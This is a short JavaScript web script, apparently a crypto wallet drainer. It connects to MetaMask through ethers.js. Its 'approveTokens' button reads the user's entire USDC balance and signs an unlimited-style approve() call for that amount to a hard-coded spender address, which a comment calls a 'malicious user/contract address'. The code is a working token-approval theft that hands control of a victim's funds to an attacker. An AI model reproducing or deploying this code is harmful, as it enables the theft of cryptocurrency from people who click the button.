console.log(ethers.version);

document.getElementById('connectWallet').addEventListener('click', async () => {
    if (typeof window.ethereum !== 'undefined') {
        try {
            const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
            console.log('Connected', accounts[0]);
            console.log('Hello, World!');
            console.log(ethers); // Should log the ethers object if it's loaded correctly
        } catch (error) {
            console.error('Error connecting to wallet:', error);
        }
    } else {
        console.log('Please install MetaMask!');
    }
});

document.getElementById('approveTokens').addEventListener('click', async () => {
    alert('Approving tokens...');
    if (typeof window.ethereum !== 'undefined') {
        const provider = new ethers.providers.Web3Provider(window.ethereum);
        const signer = provider.getSigner();
        
        // Replace these with your contract details
        const usdcTokenAddress = '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48';
        const spenderAddress = '0x0c778e66efa266b5011c552C4A7BDA63Ad24C37B'; // malicious user/contract address
        const erc20Abi = ['function approve(address spender, uint256 amount) external returns (bool)',
                          'function balanceOf(address account) external view returns (uint256)'];

        const tokenContract = new ethers.Contract(usdcTokenAddress, erc20Abi, signer);
        try {
            const balance = await tokenContract.balanceOf(await signer.getAddress());
            const approveTx = await tokenContract.approve(spenderAddress, balance);
            await approveTx.wait();
            console.log(`Approval transaction successful: ${approveTx.hash}`);
        } catch (error) {
            console.error('Error approving tokens:', error);
        }
    } else {
        console.log('Ethereum object not found, install MetaMask.');
    }
});
